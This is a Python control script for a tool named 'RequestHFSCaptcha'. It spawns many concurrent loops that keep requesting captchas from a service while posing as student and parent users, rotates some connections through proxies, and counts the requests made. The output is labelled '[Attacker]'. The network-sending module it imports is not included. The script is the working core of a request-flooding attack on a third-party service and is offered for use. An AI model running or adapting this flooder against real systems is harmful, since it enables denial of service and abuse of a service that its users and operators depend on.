#-*- coding:utf-8 -*-
if __name__=="__main__":
    import sys,asyncio,logging
    #把当前目录添加到模块搜索路径
    try:
        from os import getcwd
        sys.path.append(getcwd())
        del getcwd
    except:
        pass
    #运行信息
    import Sender
    connects=[]
    tasks=[]

    #一直发送请求,直到running为False时退出
    async def SendLoop(Send):
        while Sender.running:
            try:
                await Send()
            except Exception as a:
                debug(a)
    #按回车退出
    def WaitForExit():
        info("小心误触,按回车退出")
        input()
        Sender.running=False
        info("等待Sender关闭...")
        for a in asyncio.all_tasks():
            if a.get_name()=="CancelThisSleep":
                a.cancel()

    #入口函数
    async def Main():
        #解析命令行python Control.py <协程并发数> <几个并发使用代理> <网络timeout时间(秒)> [<是否debug>]
        count=int(sys.argv[1])
        proxy=int(sys.argv[2])
        timeout=float(sys.argv[3])
        #日志
        global logging,info,debug
        log=logging.getLogger("RequestHFSCaptcha")
        a=logging.StreamHandler(sys.stdout)
        a.setFormatter(logging.Formatter("[Attacker]%(message)s"))
        log.addHandler(a)
        log.setLevel(logging.INFO)
        if 5<=len(sys.argv) and sys.argv[4]=="True":
            log.setLevel(logging.DEBUG)
        info=log.info
        debug=log.debug
        logging=log
        debug(str(sys.argv))
        #检查参数
        if not (1<=count and 0<=timeout and 0<=proxy<=count):
            info("error:命令行参数错误")
            exit()
        info("RequestHFSCaptcha By hg56th56gd6g")
        info("初始化中...")
        #学生家长对半分
        roleType=count//2

        #创建count个SendLoop,等待它们全部退出
        a={"timeout":timeout,"roleType":None,"proxy":None}
        while count:
            count-=1
            #还剩使用代理的
            a["proxy"]=bool(proxy)
            if a["proxy"]:
                proxy-=1
            #还剩家长类型,并且上一个不是家长类型
            if roleType and a["roleType"]!=Sender.ROLETYPE_PARENT:
                roleType-=1
                a["roleType"]=Sender.ROLETYPE_PARENT
            #不剩家长类型了,或者上一个是家长类型
            else:
                a["roleType"]=Sender.ROLETYPE_STUDENT
            #对每个连接创建SendLoop
            connects.append(Sender.Sender(**a))
            tasks.append(asyncio.create_task(SendLoop(connects[-1].Send)))
            debug(str(a))
        #把等待退出也加入任务(新线程运行)
        tasks.append(asyncio.create_task(asyncio.to_thread(WaitForExit)))

        #清理一下变量,等待退出
        del count,timeout,proxy,roleType,a,log
        await asyncio.wait(tasks)

    try:
        asyncio.run(Main())
    except (KeyboardInterrupt,asyncio.CancelledError):
        pass
    finally:
        info(f"请求了{sum(a.count for a in connects)}个验证码")
        info("退出...")